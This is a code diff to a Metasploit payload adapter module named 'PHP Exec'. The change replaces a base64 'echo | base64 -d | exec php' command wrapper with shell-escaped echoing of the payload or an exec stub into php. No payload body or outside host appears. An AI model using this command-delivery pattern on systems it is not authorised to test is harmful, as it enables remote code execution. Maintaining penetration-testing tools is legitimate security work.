@@ -5,12 +5,13 @@
 
 module MetasploitModule
   include Msf::Payload::Adapter
+
   def initialize(info = {})
     super(
       update_info(
         info,
         'Name' => 'PHP Exec',
-        'Description' => 'Execute a PHP payload from a command',
+        'Description' => 'Execute a PHP payload as an OS command from a Posix-compatible shell',
         'Author' => ['Spencer McIntyre', 'msutovsky-r7'],
         'Platform' => 'unix',
         'Arch' => ARCH_CMD,
@@ -31,7 +32,17 @@ module MetasploitModule
 
   def generate(_opts = {})
     payload = super
-    "echo '#{Base64.strict_encode64(payload)}'|base64 -d|exec $(command -v php)"
+
+    escaped_exec_stub = Shellwords.escape(Msf::Payload::Php.create_exec_stub(payload))
+
+    if payload.include?("\n")
+      escaped_payload = escaped_exec_stub
+    else
+      # pick the shorter one
+      escaped_payload = [Shellwords.escape(payload), escaped_exec_stub].min_by(&:length)
+    end
+
+    "echo #{escaped_payload}|exec php"
   end
 
   def include_send_uuid
